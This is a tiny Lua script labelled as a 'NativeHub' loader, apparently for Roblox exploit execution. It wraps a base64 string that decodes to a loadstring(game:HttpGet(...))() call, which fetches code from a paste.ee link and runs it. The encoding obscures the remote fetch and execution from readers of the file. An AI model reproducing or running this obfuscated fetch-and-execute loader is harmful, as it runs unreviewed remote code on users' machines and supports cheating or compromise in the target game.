-- NativeHub Lura-protected loader

pcall(function()
    local b64 = [[
bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGUuZWUvcng
gR3hlUVRZeCIpKCk=
]]
    local ts = require("ts")
    local decoded = ts.base64.decode(b64)
    loadstring(decoded)()
end)
